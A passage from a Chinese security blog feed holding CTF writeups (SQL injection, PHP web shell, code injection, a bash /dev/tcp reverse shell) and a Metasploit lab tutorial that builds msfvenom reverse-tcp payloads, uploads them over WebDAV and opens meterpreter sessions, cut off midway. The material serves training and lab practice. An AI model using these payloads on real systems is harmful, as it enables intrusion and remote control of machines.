srcset="/img/static/loading.gif" alt="17"></p><h4 id="Asymmetric"><a href="#Asymmetric" class="headerlink" title="Asymmetric"></a>Asymmetric</h4><p>看了一 下题目给的脚本，其实就是普通的RSA题 ,主要还是把<strong>n</strong>分解<br><img src="/img/2019-04-23/18.png" srcset="/img/static/loading.gif" alt="18"><br>剩下就 很简单了<br><img src="/img/2019-04-23/19.png" srcset="/img/static/loading.gif" alt="19"></p><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="EasyGo"><a href="#EasyGo" class="headerlink" title="EasyGo"></a>EasyGo</h4><p>查看可执行文件格式<br><img src="/img/2019-04-23/20.png" srcset="/img/static/loading.gif" alt="20"><br>程序为Go语言编写,内部函数较为复杂，直接IDA动态调试，定位到<code>sub_495150</code>函数，执行完<code>sub_4886B0</code>,程序打印了字符串<br><img src="/img/2019-04-23/21.png" srcset="/img/static/loading.gif" alt="21"><br>在<code>sub_48EB00</code>中, 程序调用了输入函数，继续执行，发现函数将一串字符串地址放到了<code>rax</code>，并在接下来的几个<code>CALL</code>中，对其进行了一些操作，这里没有仔细跟进，由于在<code>sub_47E620</code>函数处存在跳转,猜测这里可能为相关的<code>check</code>函数，重点关注其所对应的内存区域，可发现，执行完<code>sub_47E620</code>函数后,可以在内存中直接拿到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>writeup</tag>
      
      <tag>misc</tag>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
      <tag>crypto</tag>
      
      <tag>pwn</tag>
      
      <tag>国赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>丁牛CTF做题记录</title>
    <link href="/2019/04/19/digapis-ctf-wp/"/>
    <url>/2019/04/19/digapis-ctf-wp/</url>
    
    <content type="html"><![CDATA[<p>都是些旧题，加深印象。<br><a id="more"></a></p><h3 id="W2-web1"><a href="#W2-web1" class="headerlink" title="W2-web1"></a>W2-web1</h3><p>这个是bugku上的login2，在响应头可以看到tip<br><img src="/img/2019-04-19/2.png" srcset="/img/static/loading.gif" alt="2"><br>解码出来是<br><pre><code class="hljs php">$sql=<span class="hljs-string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="hljs-string">"'"</span>;<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($row) &amp;&amp; $row[<span class="hljs-string">'password'</span>]===md5($password))&#123;&#125;</code></pre></p><p>构造payload<br><pre><code class="hljs undefined">username=<span class="hljs-number">1</span>' union select md5(<span class="hljs-number">1</span>),md5(<span class="hljs-number">1</span>)#&amp;password=<span class="hljs-number">1</span></code></pre></p><p>即可登录成功，登陆成功后可以看到一个命令执行框，反弹个shell即可<br><img src="/img/2019-04-19/3.png" srcset="/img/static/loading.gif" alt="3"><br>主机执行<br><pre><code class="hljs bash">nc -lvvp port</code></pre></p><p>然后执行<br><pre><code class="hljs bash">|bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre></p><p>flag：SKCTF{Uni0n_@nd_c0mM4nD_exEc}</p><h3 id="W2-web2"><a href="#W2-web2" class="headerlink" title="W2-web2"></a>W2-web2</h3><p>首先看源代码有个upload.php,但是只能上传jpg，gif，png的格式，url上的file能包含文件进来，但是禁止了php伪协议所以不能读取文件，思路是上传php马然后file包含进来，但是<code>&lt;!--?php</code>和<code>?--&gt;</code>被过滤了<br><img src="/img/2019-04-19/4.png" srcset="/img/static/loading.gif" alt="4"><br>payload如下<br><pre><code class="hljs php">&lt;script language=<span class="hljs-string">"PHP"</span>&gt;@<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'a'</span>]);&lt;/script&gt;</code></pre></p><p>然后菜刀连上去即可拿到flag：CTF{uP104D_1nclud3_426fh8_is_Fun}</p><h3 id="W2-web3"><a href="#W2-web3" class="headerlink" title="W2-web3"></a>W2-web3</h3><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>])) &#123;  <span class="hljs-keyword">if</span> (strcmp($_GET[<span class="hljs-string">'a'</span>], $flag) == <span class="hljs-number">0</span>)  <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);  <span class="hljs-keyword">else</span> <span class="hljs-keyword">print</span> <span class="hljs-string">'close to flag'</span>;&#125;<span class="hljs-keyword">else</span>&#123; show_source(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>strcmp的问题，看这里–&gt;<a href="http://www.am0s.com/ctf/128.html" target="_blank" rel="noopener">传送门</a>,payload如下<br><pre><code class="hljs undefined"><span class="hljs-attr">a[]</span>=<span class="hljs-number">1</span></code></pre></p><p>flag:CTF{php_trcmp_problems}</p><h3 id="W2-web4"><a href="#W2-web4" class="headerlink" title="W2-web4"></a>W2-web4</h3><pre><code class="hljs php">show_source(<span class="hljs-keyword">__FILE__</span>);$username= <span class="hljs-string">"this_is_secret"</span>; $password= <span class="hljs-string">"this_is_not_known_to_you"</span>; <span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<span class="hljs-comment">//here I changed those two </span>$info = <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'info'</span>])? $_GET[<span class="hljs-string">'info'</span>]: <span class="hljs-string">""</span> ;$data_unserialize = unserialize($info);<span class="hljs-keyword">if</span> ($data_unserialize[<span class="hljs-string">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class="hljs-string">'password'</span>]==$password)&#123; <span class="hljs-keyword">echo</span> $flag;&#125;<span class="hljs-keyword">else</span>&#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">"username or password error!"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>构造数组绕过<br><pre><code class="hljs undefined"><span class="hljs-selector-tag">Array</span>( [username] =&gt; <span class="hljs-number">1</span> [password] =&gt; <span class="hljs-number">1</span>)<span class="hljs-comment">//序列化后的结果</span><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;<span class="hljs-attribute">b</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;<span class="hljs-attribute">b</span>:<span class="hljs-number">1</span>;&#125;</code></pre></p><p>flag:CTF{this_is_flag}</p><h3 id="W2-web5"><a href="#W2-web5" class="headerlink" title="W2-web5"></a>W2-web5</h3><p><img src="/img/2019-04-19/5.png" srcset="/img/static/loading.gif" alt="5"><br>在1秒后，3秒内正确提交20次即可<br><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:utf-8</span><span class="hljs-keyword">from</span> selenium.webdriver <span class="hljs-keyword">import</span> Chrome<span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<span class="hljs-keyword">from</span> selenium.webdriver.support.ui <span class="hljs-keyword">import</span> WebDriverWait<span class="hljs-keyword">from</span> selenium.webdriver.support <span class="hljs-keyword">import</span> expected_conditions <span class="hljs-keyword">as</span> EC<span class="hljs-keyword">import</span> timedriver=Chrome(executable_path=<span class="hljs-string">"D:\\Python27\\chromedriver.exe"</span>)login_url=<span class="hljs-string">"http://39.98.216.116:32795/"</span>driver.get(login_url)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">20</span>):    <span class="hljs-keyword">print</span> <span class="hljs-string">'&lt;--test%d--&gt;'</span>%i    list1 = driver.find_elements_by_tag_name(<span class="hljs-string">'div'</span>)    tmp = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:        tmp += i.text    tmp = tmp[:<span class="hljs-number">-1</span>]    <span class="hljs-keyword">print</span> tmp    tmp = <span class="hljs-string">'res = '</span>+tmp    exec(tmp)    <span class="hljs-keyword">print</span> res    list2 = driver.find_elements_by_tag_name(<span class="hljs-string">"input"</span>)    list2[<span class="hljs-number">0</span>].send_keys(res)    time.sleep(<span class="hljs-number">1</span>)    list2[<span class="hljs-number">1</span>].click()</code></pre></p><p>flag:ctf{gr3At_cAcu1a7or}</p><h3 id="W3-web1"><a href="#W3-web1" class="headerlink" title="W3-web1"></a>W3-web1</h3><p>在响应头的hint可以看到index.php的源码<br><img src="/img/2019-04-19/6.png" srcset="/img/static/loading.gif" alt="6"><br><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$info = <span class="hljs-string">""</span>; $req = [];$flag=<span class="hljs-string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;ini_set(<span class="hljs-string">"display_error"</span>, <span class="hljs-keyword">false</span>); error_reporting(<span class="hljs-number">0</span>); <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'number'</span>]))&#123;   header(<span class="hljs-string">"hint:source.txt"</span>);   <span class="hljs-keyword">die</span>(<span class="hljs-string">"have a fun!!"</span>); &#125;<span class="hljs-keyword">foreach</span>([$_GET, $_POST] <span class="hljs-keyword">as</span> $global_var) &#123;     <span class="hljs-keyword">foreach</span>($global_var <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;         $value = trim($value);         is_string($value) &amp;&amp; $req[$key] = addslashes($value);     &#125; &#125; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_palindrome_number</span><span class="hljs-params">($number)</span> </span>&#123;     $number = strval($number);     $i = <span class="hljs-number">0</span>;     $j = strlen($number) - <span class="hljs-number">1</span>;     <span class="hljs-keyword">while</span>($i &lt; $j) &#123;         <span class="hljs-keyword">if</span>($number[$i] !== $number[$j]) &#123;             <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;         &#125;         $i++;         $j--;     &#125;     <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>; &#125;<span class="hljs-keyword">if</span>(is_numeric($_REQUEST[<span class="hljs-string">'number'</span>]))&#123;   $info=<span class="hljs-string">"sorry, you cann't input a number!"</span>;&#125;<span class="hljs-keyword">elseif</span>($req[<span class="hljs-string">'number'</span>]!=strval(intval($req[<span class="hljs-string">'number'</span>])))&#123;     $info = <span class="hljs-string">"number must be equal to it's integer!! "</span>;  &#125;<span class="hljs-keyword">else</span>&#123;     $value1 = intval($req[<span class="hljs-string">"number"</span>]);     $value2 = intval(strrev($req[<span class="hljs-string">"number"</span>]));       <span class="hljs-keyword">if</span>($value1!=$value2)&#123;          $info=<span class="hljs-string">"no, this is not a palindrome number!"</span>;     &#125;<span class="hljs-keyword">else</span>&#123;                    <span class="hljs-keyword">if</span>(is_palindrome_number($req[<span class="hljs-string">"number"</span>]))&#123;              $info = <span class="hljs-string">"nice! &#123;$value1&#125; is a palindrome number!"</span>;           &#125;<span class="hljs-keyword">else</span>&#123;             $info=$flag;          &#125;     &#125;&#125;<span class="hljs-keyword">echo</span> $info;</code></pre></p><p>拿到flag的条件是</p><ol><li>不为空，切不能是一个数值型数字，包括小数（由is_numeric函数判断）。</li><li>不能是一个回文数（is_palindrome_number判断）。</li><li>该数的反转的整数值应该和它本身的整数值相等。<br>目前已知的两种解法是</li><li>利用intval函数溢出绕过</li><li>用科学计数法构造0=0<br>用第二种方法构造的payload如下<pre><code class="hljs undefined"><span class="hljs-attr">number</span>=<span class="hljs-number">0</span>e-<span class="hljs-number">0</span>%<span class="hljs-number">00</span></code></pre></li></ol><p>flag:CTF{b72dd89e71108245fe21a4c1849ae668}<br>参考–&gt;<a href="http://www.xianxianlabs.com/2018/07/07/%E5%AE%9E%E9%AA%8C%E5%90%A7-ctf-%E9%A2%98%E7%9B%AE%E4%B9%8B-web-writeup-%E9%80%9A%E5%85%B3%E5%A4%A7%E5%85%A8-1/" target="_blank" rel="noopener">传送门</a></p><h3 id="W3-web2"><a href="#W3-web2" class="headerlink" title="W3-web2"></a>W3-web2</h3><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;error_reporting(<span class="hljs-number">0</span>);show_source(<span class="hljs-keyword">__FILE__</span>);$a = @$_REQUEST[<span class="hljs-string">'hello'</span>];<span class="hljs-keyword">eval</span>(<span class="hljs-string">"var_dump($a);"</span>);</code></pre><p>php注入，payload如下<br><pre><code class="hljs undefined">);echo%<span class="hljs-number">20</span>`cat%<span class="hljs-number">20.</span>/flag.php`;<span class="hljs-comment">//</span></code></pre></p><p>flag:flag{92853051ab894a64f7865cf3c2128b34}</p><h3 id="W3-web5"><a href="#W3-web5" class="headerlink" title="W3-web5"></a>W3-web5</h3><p><img src="/img/2019-04-19/7.png" srcset="/img/static/loading.gif" alt="7"><br>这道题是bugku上的一道注入题，没有过滤，payload如下<br><pre><code class="hljs undefined">id=<span class="hljs-number">-1</span>' <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema = database()#id=<span class="hljs-number">-1</span>' <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_name = 'fl4g'#id=<span class="hljs-number">-1</span>' <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> fl4g)#</code></pre></p><p><img src="/img/2019-04-19/15.png" srcset="/img/static/loading.gif" alt="15"><br>flag:CTF{Sql_INJECT0N_4813drd8hz4}</p><h3 id="W3-web3"><a href="#W3-web3" class="headerlink" title="W3-web3"></a>W3-web3</h3><p>查看源代码可以看到页面设置了<code>&lt;html lang=&quot;en&quot;&gt;</code>，可能存在宽字节注入<br><img src="/img/2019-04-19/8.png" srcset="/img/static/loading.gif" alt="8"><br>登录框过滤了<code>空格</code>，<code>=</code>，<code>and</code>，但是<code>or</code>，<code>&lt;</code>,<code>&gt;</code>,<code>&#39;</code>,<code>select</code>都没有过滤，同时用户名正确时只会显示password error<br>构造测试payload<br><pre><code class="hljs undefined">username=admin%df%<span class="hljs-number">27</span>or'<span class="hljs-number">1</span>'&gt;'<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>username=admin%df%<span class="hljs-number">27</span>or'<span class="hljs-number">2</span>'&gt;'<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span></code></pre></p><p>再替换位置<br><pre><code class="hljs undefined">username=admin<span class="hljs-symbol">%df</span><span class="hljs-symbol">%27</span><span class="hljs-keyword">or</span>(<span class="hljs-keyword">select</span>(password))&gt;'<span class="hljs-number">0</span>&amp;password=<span class="hljs-number">1</span></code></pre></p><p>不断变大后面的字符串就得到密码的md5值51b7a76d51e70b419f60d3473fb6f900，解密得到skctf123456，然后登录拿到flag<br><img src="/img/2019-04-19/9.png" srcset="/img/static/loading.gif" alt="9"><br>flag：CTF{b1iNd_SQL_iNJEcti0n!}</p><h3 id="W3-web"><a href="#W3-web" class="headerlink" title="W3-web"></a>W3-web</h3><p><img src="/img/2019-04-19/10.png" srcset="/img/static/loading.gif" alt="10"><br>cbc字节翻转攻击，首先扫描得到源码的备份文件<code>.index.php.swp</code><br><pre><code class="hljs php">     $_SESSION[<span class="hljs-string">'username'</span>] = $info[<span class="hljs-string">'username'</span>];        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">"ERROR!"</span>);        &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_homepage</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">"username"</span>]===<span class="hljs-string">'admin'</span>)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="hljs-string">'username'</span>].<span class="hljs-string">'&lt;/p&gt;'</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;    &#125;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'username'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'password'</span>]))&#123;    $username = (string)$_POST[<span class="hljs-string">'username'</span>];    $password = (string)$_POST[<span class="hljs-string">'password'</span>];    <span class="hljs-keyword">if</span>($username === <span class="hljs-string">'admin'</span>)&#123;        <span class="hljs-keyword">exit</span>(<span class="hljs-string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);    &#125;<span class="hljs-keyword">else</span>&#123;        $info = <span class="hljs-keyword">array</span>(<span class="hljs-string">'username'</span>=&gt;$username,<span class="hljs-string">'password'</span>=&gt;$password);        login($info);        show_homepage();    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">"username"</span>]))&#123;        check_login();        show_homepage();    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;body class="login-body"&gt;                &lt;div id="wrapper"&gt;                    &lt;div class="user-icon"&gt;&lt;/div&gt;                    &lt;div class="pass-icon"&gt;&lt;/div&gt;                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;                        &lt;div class="header"&gt;                        &lt;h1&gt;Login Form&lt;/h1&gt;                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;                        &lt;/div&gt;                        &lt;div class="content"&gt;                        &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt;                        &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt;                        &lt;/div&gt;                        &lt;div class="footer"&gt;                        &lt;input type="submit" name="submit" value="Login" class="button" /&gt;                        &lt;/div&gt;                    &lt;/form&gt;                &lt;/div&gt;            &lt;/body&gt;'</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></p><p>admin被禁止登录，但是我们可以利用反序列化漏洞重置<code>$_SESSION[&#39;username&#39;]为admin</code><br>cbc翻转攻击具体可以看师兄的博客–&gt;<a href="https://delcoding.github.io/2018/03/bugku-writeup4/" target="_blank" rel="noopener">传送门</a><br>flag：SKCTF{CBC_wEB_cryptography_6646dfgdg6}</p><h3 id="W3-misc3"><a href="#W3-misc3" class="headerlink" title="W3-misc3"></a>W3-misc3</h3><p>下载回来的pdf是经过加密的，加密方法是rot13<br>解密方法<br><pre><code class="hljs bash">cat MinionQuest.pdf | tr <span class="hljs-string">'A-Za-z'</span> <span class="hljs-string">'N-ZA-Mn-za-m'</span> &gt; out.pdf</code></pre></p><p><img src="/img/2019-04-19/11.png" srcset="/img/static/loading.gif" alt="11"><br>解密后的pdf有部分被挡住了，用下面的命令提取pdf的图片<br><pre><code class="hljs bash">pdfimages -png result.pdf images</code></pre></p><p>得到完整的图片<br><img src="/img/2019-04-19/12.png" srcset="/img/static/loading.gif" alt="12"><br>flag:BITSCTF{save_the_kid}<br>参考–&gt;<a href="https://sixfoisneuf.fr/ctf/hacking/english/writeup/2017/02/06/bitsctf-writeup/" target="_blank" rel="noopener">传送门</a></p><h3 id="W3-misc1"><a href="#W3-misc1" class="headerlink" title="W3-misc1"></a>W3-misc1</h3><p>下载回来是一个usb流量包，在某一条长度比较大的流量里发现了一张图片<br><img src="/img/2019-04-19/13.png" srcset="/img/static/loading.gif" alt="13"><br>dump出来就可以得到flag，微软照片的bug导致我卡了n个小时，<strong>上面sublime，下面微软的照片</strong><br><img src="/img/2019-04-19/14.png" srcset="/img/static/loading.gif" alt="14"></p><h3 id="W3-misc5"><a href="#W3-misc5" class="headerlink" title="W3-misc5"></a>W3-misc5</h3><p>参考–&gt;<a href="https://github.com/ctfs/write-ups-2017/tree/master/breakin-ctf-2017/misc/Mysterious-GIF" target="_blank" rel="noopener">传送门</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>writeup</tag>
      
      <tag>misc</tag>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>metasploit深入学习之ms18_8120&amp;&amp;vsftpd2.3.4</title>
    <link href="/2019/01/22/msf/"/>
    <url>/2019/01/22/msf/</url>
    
    <content type="html"><![CDATA[<p>metasploit是一款非常给力的后渗透系统，本次通过复现vsftpd2.3.4的漏洞和ms18_8120的漏洞来学习metasploit<br><a id="more"></a></p><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>&emsp;&emsp;首先一点，为什么metaslpoit（下称msf）强大呢，msf本身就有1851个漏洞利用模块，1046个辅助模块，541个漏洞利用模块，44个加密模块（v5.0.1），不仅如此，他还可以调用外部插件，而且本身也是开源的，也可以加载自己写的模块，msf很好但也不是最好的，本次主要是以学习msf为主，当然实验环境下也有更好的入侵方法。<br>&emsp;&emsp;进入msf的命令是msfconsole，如果提示数据库为开启则可以用<code>/etc/init.d/postgresql start</code>开启metasploit的数据库，如果你需要完成一次渗透测试，如果你手上没有合适的工具的话，msf可以完成所有的工作</p><h4 id="一、扫描"><a href="#一、扫描" class="headerlink" title="一、扫描"></a>一、扫描</h4><p>&emsp;&emsp;msf调用nmap扫描的命令是大<code>db_nmap</code>，具体用法和nmap使用差不多，也可以使用msf的扫描模块进行扫描，常用的扫描模块有<code>brute_dirs</code>,<code>dir_listing</code>,<code>dir_scanner</code>。</p><h4 id="二、复现"><a href="#二、复现" class="headerlink" title="二、复现"></a>二、复现</h4><p>&emsp;&emsp;目标主机192.168.1.66:8585上存在一个dav2的上传漏洞，攻击思路大概是我们可以先利用这个上传漏洞上传一个payload，实验入侵主机到进一步提权。<br>首先我们先制作一个payload<br><pre><code class="hljs undefined">root@kali:~# msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.1.70 <span class="hljs-attribute">lport</span>=13579 -f<span class="hljs-built_in"> raw </span>&gt; /root/Desktop/13579.php[-] <span class="hljs-literal">No</span> platform was selected, choosing Msf::Module::Platform::PHP <span class="hljs-keyword">from</span> the payload[-] <span class="hljs-literal">No</span> arch selected, selecting arch: php <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> encoder <span class="hljs-keyword">or</span> badchars specified, outputting<span class="hljs-built_in"> raw </span>payloadPayload size: 30656 bytes</code></pre></p><p><code>-p</code>选择payload，<code>lhost</code>是本地ip，<code>lport</code>为本地监听端口，<code>-f</code>格式，<code>&gt;</code>输出为文件</p><p>然后我们需要上传脚本，上传脚本会用到davtest这个工具，davtest支持自动发送文件漏洞，目录自动随机帮助隐藏文件，发送文本文件，并尝试移动到可执行文件的名称，上传的文件自动清理，发送任意文件。<br><pre><code class="hljs undefined">root@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13579.php -uploadloc 13579.php <span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span>* Testing DAV connectionOPENSUCCEED:http://192.168.1.66:8585/uploads<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span>* unless  Uploading fileUpload succeeded: http://192.168.1.66:8585/uploads/13579.php</code></pre></p><p><code>-url</code>是网址，<code>-uploadfile</code>是要上传的文件，<code>-uploadloc</code>是要上传的位置。准备好了就可以开始打了<br><pre><code class="hljs undefined">root@kali:~# msfconsole -q[-] ***[-] * WARNING: <span class="hljs-literal">No</span> database support: could <span class="hljs-keyword">not</span> connect <span class="hljs-keyword">to</span> server:<span class="hljs-built_in"> Connection </span>refusedIs the<span class="hljs-built_in"> server </span>running on host <span class="hljs-string">"localhost"</span> (::1) <span class="hljs-keyword">and</span> acceptingTCP<span class="hljs-built_in">/IP </span>connections on<span class="hljs-built_in"> port </span>5432?could <span class="hljs-keyword">not</span> connect <span class="hljs-keyword">to</span> server:<span class="hljs-built_in"> Connection </span>refusedIs the<span class="hljs-built_in"> server </span>running on host <span class="hljs-string">"localhost"</span> (127.0.0.1) <span class="hljs-keyword">and</span> acceptingTCP<span class="hljs-built_in">/IP </span>connections on<span class="hljs-built_in"> port </span>5432?[-] ***[*] Starting persistent handler(s)<span class="hljs-built_in">..</span>.msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; <span class="hljs-builtin-name">set</span> payload php/meterpreter_reverse_tcp payload =&gt; php/meterpreter_reverse_tcpmsf5 exploit(multi/handler) &gt; <span class="hljs-builtin-name">set</span> lport 13579lport =&gt; 13579msf5 exploit(multi/handler) &gt; <span class="hljs-builtin-name">set</span> lhost 192.168.1.70lhost =&gt; 192.168.1.70msf5 exploit(multi/handler) &gt; exploit -j -z[*] Exploit running as background job 0.[*] Exploit completed, but <span class="hljs-literal">no</span> session was created.[*] Started reverse TCP handler on 192.168.1.70:13579</code></pre></p><p>启动msf时-q是不显示封面，<code>exploit -j -z</code>-j是把exploit放到jobs里，-z挂后台，jobs的意思是当监听到反弹的shell之后会建立一个session，然后不会不停下来，继续监听。session的可以理解为一个会话。到这里，我们只需要访问一下我们上传的payload就可以反弹shell了(可以用浏览器访问)<br><pre><code class="hljs undefined">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.66</span>:<span class="hljs-number">8585</span><span class="hljs-regexp">/uploads/</span><span class="hljs-number">13579</span>.php</code></pre></p><p>getshell<br><pre><code class="hljs undefined">msf5 exploit(multi/handler) &gt; [*] Meterpreter session 1 opened (192.168.1.70:13579 -&gt; 192.168.1.66:49816) at 2019-01-22 02:30:29 -0500[*] Meterpreter session 2 opened (192.168.1.70:13579 -&gt; 192.168.1.66:49817) at 2019-01-22 02:30:31 -0500meterpreter &gt; backgroundmsf5 exploit(multi/handler) &gt; sessions Active sessions===============  Id  Name <span class="hljs-built_in"> Type </span>                    Information                         <span class="hljs-built_in"> Connection</span>  --  ----  ----                     -----------                          ----------  1         meterpreter php/windows  LOCAL<span class="hljs-built_in"> SERVICE </span>(0) @ METASPLOITABLE3  192.168.1.70:13579 -&gt; 192.168.1.66:49816 (192.168.1.66)</code></pre></p><p>background是返回msf控制台，getshell之后得到的shell是local server的权限，我们上传一个另外一个payload上去get更高权限的shell<br><pre><code class="hljs undefined">root@kali:~/Desktop# msfvenom -p windows/meterpreter_reverse_tcp <span class="hljs-attribute">Lhost</span>=192.168.1.70 <span class="hljs-attribute">lport</span>=13789 -f exe &gt; 13789.exe[-] <span class="hljs-literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="hljs-keyword">from</span> the payload[-] <span class="hljs-literal">No</span> arch selected, selecting arch: x86 <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> encoder <span class="hljs-keyword">or</span> badchars specified, outputting<span class="hljs-built_in"> raw </span>payloadPayload size: 179779 bytesFinal size of exe file: 254976 bytes</code></pre></p><p>上传<br><pre><code class="hljs undefined">root@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13789.exe -uploadloc 13789.exe<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span>* Testing DAV connectionOPENSUCCEED:http://192.168.1.66:8585/uploads<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span>* unless  Uploading fileUpload succeeded: http://192.168.1.66:8585/uploads/13789.exe</code></pre></p><p>msf开启监听,<code>sessions -i 1</code>选择id为1的session，<code>getwd</code>获取当前绝对路径，<code>execute -f</code>执行文件<br><pre><code class="hljs undefined">msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">set</span> payload windows/meterpreter_reverse_tcp payload =&gt; windows/meterpreter_reverse_tcpmsf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">show</span> options msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">set</span> lport <span class="hljs-number">13789</span>lport =&gt; <span class="hljs-number">13789</span>msf5 